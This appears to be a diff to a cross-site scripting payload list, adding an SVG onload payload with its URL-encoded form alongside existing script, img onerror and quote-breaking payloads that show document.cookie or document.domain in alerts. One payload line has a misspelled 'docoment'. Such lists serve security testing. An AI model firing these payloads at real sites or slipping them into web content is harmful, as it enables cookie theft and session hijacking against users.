@@ -9,3 +9,4 @@
 - <img src=x onerror=alert(document.cookie)>
 - "><script>alert(docoment.cookie)</script> encoded as %2522%253E%253Cscript%253Ealert(document.cookie)%253C/script%253E
 - ');alert(document.domain);//
+- <svg on onload=(alert)(document.domain)> encoded as %3Csvg+on+onload%3D%28alert%29%28document.domain%29%3E
